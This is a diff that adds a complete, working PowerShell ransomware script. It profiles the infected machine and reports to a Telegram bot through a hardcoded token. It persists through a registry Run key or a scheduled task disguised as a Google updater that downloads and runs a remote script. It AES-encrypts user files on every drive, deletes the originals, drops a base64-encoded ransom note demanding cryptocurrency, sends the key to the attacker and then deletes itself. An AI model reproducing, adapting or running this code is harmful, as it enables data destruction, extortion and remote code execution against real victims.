@@ -1,0 +1,274 @@
+$ErrorActionPreference= 'silentlycontinue'
+$redExclamation = [char]0x203C
+
+function Send-TelegramMessage {
+    param (
+        [string]$message
+    )
+
+    $ErrorActionPreference = 'silentlycontinue'
+    $Messaging = $message
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+    $compSystem = Get-WmiObject -Class Win32_ComputerSystem
+    $domain = $null
+    if ($compSystem.PartOfDomain) {
+        $domain = "$($compSystem.Domain)"
+    } else {
+        Write-Output "Domain not found"
+    }
+
+    $botToken = "7484009227:AAEvngzrIKFNFdfSqECzWAqbnB5IXk8pjVo" 
+    $chatID = "-1002168553106"
+    $serverIP = "Server IP"
+    $os = Get-WmiObject Win32_OperatingSystem
+    $osVersion = $os.Caption
+    $ipAddress = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq 'Ethernet' -and $_.AddressFamily -eq 'IPv4' }).IPAddress
+    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
+    $externalIP = $ipInfo.ip
+    $computerName = $env:COMPUTERNAME
+    $userName = $env:USERNAME
+
+    #----------LOCATION----------
+    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
+    $location = $ipInfo.loc
+    $city = $ipInfo.city
+    $region = $ipInfo.region
+    $country = $ipInfo.country
+
+    if (-not (Test-Connection -ComputerName $serverIP -Count 1 -Quiet)) { 
+        if($domain){
+            $redExclamation = [char]0x203C
+            $messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName `n$($redExclamation)Domain: <b>$domain</b>"
+            $adminResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getChatAdministrators?chat_id=$chatID" -Method Get
+            $admins = $adminResponse.result
+            foreach ($admin in $admins) {
+                $adminId = $admin.user.id
+                $sendMessageParams = @{
+                    chat_id = $adminId
+                    text = $messageText
+                    parse_mode = "HTML"
+                }
+                $jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
+                $utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)
+                try {
+                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
+                } catch {
+                    Write-Output "Restricted"
+                }
+            }
+        } else {
+            $messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName"
+            $sendMessageParams = @{
+                chat_id = $chatID
+                text = $messageText
+                parse_mode = "HTML"
+            }
+
+            $jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
+            $utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)
+
+            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
+        }
+    }
+}
+
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regName = "Google LLC Updater"
+    $regValue = "mshta.exe vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://raw.githubusercontent.com/sap3r-encrypthub/encrypthub/main/locker/locker.ps1'|iex`",0)(window.close)"
+
+    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
+
+    $property = Get-ItemProperty -Path $regPath -Name $regName
+    if ($property.$regName -eq $regValue) {
+        $message = "[LOCKER] REG AutoRun success"
+        Send-TelegramMessage -message $message
+    } else {
+        $message = "[LOCKER] REG AutoRun fail"
+        Send-TelegramMessage -message $message
+    }
+} else {
+	$backName = "Google LLC Updater"
+	$task = Get-ScheduledTask -TaskName $backName -ErrorAction SilentlyContinue
+	if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+		Unregister-ScheduledTask -TaskName $backName -Confirm:$false
+	}
+	$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://raw.githubusercontent.com/sap3r-encrypthub/encrypthub/main/locker/locker.ps1'|iex`",0)(window.close)"
+	$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+	$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+	Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $backName -Description "Google Chrome Protector" -RunLevel Highest -Force | Out-Null
+	if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+		$message = "[LOCKER] TASK AutoRun success"
+		Send-TelegramMessage -message $message
+	} else {
+		$message = "[LOCKER] TASK AutoRun fail"
+		Send-TelegramMessage -message $message
+	}
+}
+
+$fileTypes = @("*.doc", "*.lgb", "*.qbw", "*.docx", "*.fac", "*.pdf", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.zip", "*.rar", "*.7z", "*.jpg", "*.jpeg","*.mp4", "*.avi", "*.mov", "*.wmv", "*.flv", "*.psd", "*.ai", "*.indd", "*.cs", "*.java", "*.cpp", "*.mp3", "*.wav", "*.dwg", "*.dxf", "*.bak", "*.tar", "*.gz", "*.bz2", "*.iso", "*.img", "*.vhd", "*.vhdx", "*.vhdi", "*.vmdi", "*.tib", "*.adi", "*.dmg", "*.sparseimage")
+$message = "$($redExclamation) Starting Encryption"
+Send-TelegramMessage -message $message
+
+$ransomNoteBase64 = @"
+KioqUkFOU09NIE5PVEUqKgoKWW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLgoKQWxsIHlvdXIgaW1wb3J0YW50IGZpbGVzLCBpbmNsdWRpbm
+cgZG9jdW1lbnRzLCBwaG90b3MsIHZpZGVvcywgYW5kIGJhY2t1cHMsIGhhdmUgYmVlbiBlbmNyeXB0ZWQgd2l0aCBzdHJvbmcgZW5jcnlwdGlvbiBh
+bGdvcml0aG1zLiBZb3UgY2Fubm90IGFjY2VzcyB5b3VyIGZpbGVzIG9yIHVzZSB0aGVtIGFueW1vcmUuIEJ1dCBkb24ndCB3b3JyeSwgeW91IGNhbi
+BzdGlsbCByZWNvdmVyIHRoZW0uCgpUbyByZXRyaWV2ZSB5b3VyIGZpbGVzLCB5b3UgbmVlZCB0byBmb2xsb3cgdGhlc2Ugc3RlcHM6CgoKMS4gRG8g
+bm90IGF0dGVtcHQgdG8gZGVjcnlwdCB5b3VyIGZpbGVzIHVzaW5nIGFueSB0aGlyZC1wYXJ0eSBzb2Z0d2FyZSwgYXMgaXQgbWF5IGNhdXNlIGlycm
+V2ZXJzaWJsZSBkYW1hZ2UuCjIuIENvbnRhY3QgdXMgaW1tZWRpYXRlbHkgYXQgW2h0dHBzOi8vdC5tZS9lbmNyeXB0aHViXShodHRwczovL3QubWUv
+ZW5jcnlwdGh1YikgdG8gZ2V0IHRoZSBkZWNyeXB0aW9uIGtleS4KMz4uIEJlIHByZXBhcmVkIHRvIHBheSBhIHJhbnNvbSBpbiBVU0RUIChUUkMyMC
+kuIFRoZSBhbW91bnQgd2lsbCBiZSBzcGVjaWZpZWQgdXBvbiBjb250YWN0aW5nIHVzLgo0LiBPbmNlIHRoZSBwYXltZW50IGlzIGNvbmZpcm1lZCwg
+eW91IHdpbGwgcmVjZWl2ZSBhIGRlY3J5cHRpb24gdG9vbCBhbG9uZyB3aXRoIGEgdW5pcXVlIGRlY3J5cHRpb24ga2V5IHRvIHJlc3RvcmUgeW91ci
+BmaWxlcy4KCkBJTVBPUlRBTlQ6CgotIERvIG5vdCBhdHRlbXB0IHRvIG1vZGlmeSBvciByZW5hbWUgdGhlIGVuY3J5cHRlZCBmaWxlcy4KLSBBbnkg
+YXR0ZW1wdHMgdG8gcmVtb3ZlIHRoZSBtYWx3YXJlIG9yIHJlY292ZXIgdGhlIGZpbGVzIHdpdGhvdXQgb3VyIGFzc2lzdGFuY2Ugd2lsbCByZXN1bH
+QgaW4gdGhlIHBlcm1hbmVudCBsb3NzIG9mIHlvdXIgZGF0YS4KLSBZb3UgaGF2ZSA3MiBob3VycyB0byBtYWtlIHRoZSBwYXltZW50LCBvciB0aGUg
+ZGVjcnlwdGlvbiBrZXkgd2lsbCBiZSBwZXJtYW5lbnRseSBkZWxldGVkLgoKRkFROgoKUyc6IEhvdyBjYW4gSSBiZSBzdXJlIHlvdSB3aWxsIHByb3
+ZpZGUgdGhlIGRlY3J5cHRpb24ga2V5IGFmdGVyIHBheW1lbnQ/CkE6IFdlIGFyZSBhIHByb2Zlc3Npb25hbCBvcmdhbml6YXRpb24sIGFuZCB3ZSBo
+YXZlIG5vIGludGVyZXN0IGluIGtlZXBpbmcgeW91ciBmaWxlcyBlbmNyeXB0ZWQuIE9uY2UgdGhlIHJhbnNvbSBpcyBwYWlkLCB3ZSB3aWxsIHNlbm
+QgeW91IHRoZSBkZWNyeXB0aW9uIHRvb2wgYW5kIGtleS4KCkEnOiBXaGF0IGlmIEkgZG9uJ3QgaGF2ZSBVU0RUIChUUkMyMCkgdG8gbWFrZSB0aGUg
+cGF5bWVudD8KQTogWW91IGNhbiBlYXNpbHkgcHVyY2hhc2UgVVNEVCAoVFJDMjApIHRocm91Z2ggdmFyaW91cyBvbmxpbmUgZXhjaGFuZ2VzLiBDb2
+50YWN0IHVzIGlmIHlvdSBuZWVkIGd1aWRhbmNlIG9uIHRoaXMgcHJvY2Vzcy4KCkEnOiBDYW4gSSByZWNvdmVyIG15IGZpbGVzIGluIGFueSBvdGhl
+ciB3YXk/CkE6IFVuZm9ydHVuYXRlbHksIHRoZSBvbmx5IHdheSB0byByZWNvdmVyIHlvdXIgZmlsZXMgaXMgYnkgb2J0YWluaW5nIHRoZSBkZWNyeX
+B0aW9uIGtleSBmcm9tIHVzLgoKQTogV2lsbCByZXBvcnRpbmcgdG8gYXV0aG9yaXRpZXMgaGVscCBtZSBzZWN1cmUgbXkgZmlsZXMgYmFjaz8KQTog
+UmVwb3J0aW5nIHRvIGF1dGhvcml0aWVzIHdpbGwgbm90IGhlbHAgeW91IGdldCB5b3VyIGZpbGVzIGJhY2suIFRoZSBvbmx5IHdheSB0byByZWNvdm
+VyIHlvdXIgZmlsZXMgaXMgdG8gY29tcGx5IHdpdGggb3VyIGluc3RydWN0aW9ucy4KCldlIHVuZGVyc3RhbmQgdGhlIGluY29udmVuaWVuY2UgdGhp
+cyBtYXkgY2F1c2UsIGJ1dCBpdCBpcyB0aGUgb25seSB3YXkgdG8gcmVzdG9yZSB5b3VyIGRhdGEuIENvbnRhY3QgdXMgaW1tZWRpYXRlbHkgdG8gYm
+VnaW4gdGhlIHJlY292ZXJ5IHByb2Nlc3MuCgotLS0KCioqQ29udGFjdDoqKgpodHRwczovL3QubWUvZW5jcnlwdGh1YgoKQmZyZWQuCgpSZW1lbWJl
+ciwgZG8gbm90IHdhc3RlIHRpbWUuIFRoZSBzb29uZXIgeW91IGNvbnRhY3QgdXMsIHRoZSBzb29uZXIgeW91IGNhbiByZXN0b3JlIHlvdXIgZmlsZX
+MuCg==
+"@
+
+function Encrypt-File {
+    param (
+        [string]$filePath,
+        [byte[]]$key,
+        [byte[]]$iv
+    )
+
+    try {
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.Key = $key
+        $aes.IV = $iv
+
+        $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
+
+        [byte[]]$fileContent = [System.IO.File]::ReadAllBytes($filePath)
+
+        $memoryStream = New-Object System.IO.MemoryStream
+        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+
+        $cryptoStream.Write($fileContent, 0, $fileContent.Length)
+        $cryptoStream.FlushFinalBlock()
+
+        $encryptedContent = $memoryStream.ToArray()
+
+        $newFilePath = $filePath + ".crypted"
+        [System.IO.File]::WriteAllBytes($newFilePath, $encryptedContent)
+
+        $cryptoStream.Close()
+        $memoryStream.Close()
+        $aes.Dispose()
+
+        Write-Output "File encrypted: $filePath"
+        Remove-Item -Path $filePath -Force
+		
+    } catch {
+        Write-Error "Error encrypting file ${filePath}: $_"
+    }
+}
+
+function Process-File {
+    param (
+        [string]$filePath,
+        [byte[]]$key,
+        [byte[]]$iv
+    )
+    try {
+        Encrypt-File -filePath $filePath -key $key -iv $iv
+        $directoryPath = [System.IO.Path]::GetDirectoryName($filePath)
+        $ransomNotePath = [System.IO.Path]::Combine($directoryPath, "README.txt")
+        if (-not (Test-Path -Path $ransomNotePath)) {
+            $ransomNoteContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ransomNoteBase64))
+            Set-Content -Path $ransomNotePath -Value $ransomNoteContent
+        }
+    } catch {
+        Write-Error "Error processing file ${filePath}: $_"
+    }
+}
+
+function Search-And-Encrypt {
+    param (
+        [string]$path,
+        [byte[]]$key,
+        [byte[]]$iv,
+        [ref]$progress
+    )
+
+    try {
+        $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue |
+                 Where-Object { $_.FullName -notlike 'C:\Windows\*' -and $_.FullName -notlike 'C:\Program Files\*' }
+
+        $totalFiles = $files.Count
+        $processedFiles = 0
+        $lastReportedProgress = -1
+
+        foreach ($file in $files) {
+            $extension = $file.Extension.ToLower()
+            if ($fileTypes -contains "*$extension") {
+                Process-File -filePath $file.FullName -key $key -iv $iv
+				$processedFiles++
+            }
+            $currentProgress = [math]::Round(($processedFiles / $totalFiles) * 100)
+            if ($currentProgress -ne $lastReportedProgress) {
+                $progress.Value = $currentProgress
+                $message = "$($redExclamation) Encrypting... `nDrive: $path `nProgress: $($processedFiles)/$($totalFiles)"
+                Send-TelegramMessage -message $message
+                $lastReportedProgress = $currentProgress
+            }
+        }
+
+        $directories = Get-ChildItem -Path $path -Directory -ErrorAction SilentlyContinue |
+                       Where-Object { $_.FullName -notlike 'C:\Windows\*' -and $_.FullName -notlike 'C:\Program Files\*' }
+
+        foreach ($directory in $directories) {
+            Search-And-Encrypt -path $directory.FullName -key $key -iv $iv -progress ([ref]$progress)
+        }
+    } catch {
+        Write-Error "Error searching and encrypting: $_"
+        $message = "$($redExclamation) Error searching and encrypting: $_"
+		Send-TelegramMessage -message $message
+    }
+}
+
+
+
+$drives = Get-WmiObject Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID
+
+function Generate-RandomKey($length) {
+    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+    $key = New-Object byte[] $length
+    $rng.GetBytes($key)
+    return $key
+}
+
+$key = Generate-RandomKey 32
+$iv = Generate-RandomKey 16
+
+$keyBase64 = [Convert]::ToBase64String($key)
+$ivBase64 = [Convert]::ToBase64String($iv)
+
+$message = "$($redExclamation)Encryption key: $keyBase64 `n$($redExclamation)Initialization vector: $ivBase64"
+Send-TelegramMessage -message $message
+
+foreach ($drive in $drives) {
+    $progress = 0
+    Search-And-Encrypt -path $drive -key $key -iv $iv -progress ([ref]$progress)
+}
+
+$message = "$($redExclamation)Encryption finish"
+Send-TelegramMessage -message $message
+$scriptPath = $MyInvocation.MyCommand.Path
+Start-Sleep -Seconds 2
+Remove-Item $scriptPath -Force
